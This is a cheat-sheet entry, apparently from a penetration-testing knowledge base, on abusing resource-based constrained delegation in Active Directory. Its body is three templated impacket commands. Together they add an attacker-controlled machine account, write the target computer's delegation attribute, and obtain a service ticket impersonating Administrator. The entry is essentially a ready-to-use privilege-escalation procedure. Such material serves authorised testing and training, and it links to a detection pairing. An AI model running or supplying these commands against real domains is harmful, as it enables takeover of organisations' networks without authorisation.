---
id: rbcd-impacket
title: Resource-based constrained delegation (RBCD)
section: Active Directory — attack paths
phase: Privilege Escalation
attack:
  tactic: TA0004
  techniques: [T1098]
platform: [windows, network]
source: Elad Shamir, "Wagging the Dog: Abusing Resource-Based Constrained Delegation" (2019)
pair: rbcd-5136
---

With write over a target computer's `msDS-AllowedToActOnBehalfOfOtherIdentity`,
point that attribute at a machine account you control, then S4U to mint a service
ticket impersonating any user (e.g. Administrator) to the target. Make a computer
account first if you can (`MachineAccountQuota` default 10). `<target>` is the
victim computer.

```sh
impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'Passw0rd!' -dc-ip {{rhost}} {{domain}}/{{user}}:{{password}}
impacket-rbcd -delegate-from 'EVIL$' -delegate-to '<target>$' -action write -dc-ip {{rhost}} {{domain}}/{{user}}:{{password}}
impacket-getST -spn cifs/<target> -impersonate Administrator -dc-ip {{rhost}} {{domain}}/'EVIL$':'Passw0rd!'
```
